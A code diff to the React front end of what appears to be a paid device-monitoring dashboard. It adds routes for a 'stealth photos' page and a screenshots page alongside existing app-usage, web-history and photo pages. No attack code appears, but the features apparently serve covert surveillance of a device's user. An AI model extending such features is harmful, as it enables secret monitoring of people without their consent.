@@ -14,6 +14,8 @@ import { AppUsagePage } from './pages/AppUsagePage';
 import { CalendarPage } from './pages/CalendarPage';
 import { WebHistoryPage } from './pages/WebHistoryPage';
 import { PhotosPage } from './pages/PhotosPage';
+import { StealthPhotosPage } from './pages/StealthPhotosPage';
+import { ScreenshotsPage } from './pages/ScreenshotsPage';
 import { LoginPage } from './pages/LoginPage';
 import { BuyNowPage } from './pages/BuyNowPage';
 import { NoLicenseModal } from './components/NoLicenseModal';
@@ -311,6 +313,11 @@ export default function App() {
       case 'photos':
       case 'gallery':
         return <PhotosPage device={activeDev} />;
+      case 'stealth_photos':
+      case 'stealth':
+        return <StealthPhotosPage device={activeDev} />;
+      case 'screenshots':
+        return <ScreenshotsPage device={activeDev} />;
       case 'webfilter':
       case 'internet-history':
         return <WebHistoryPage device={activeDev} />;
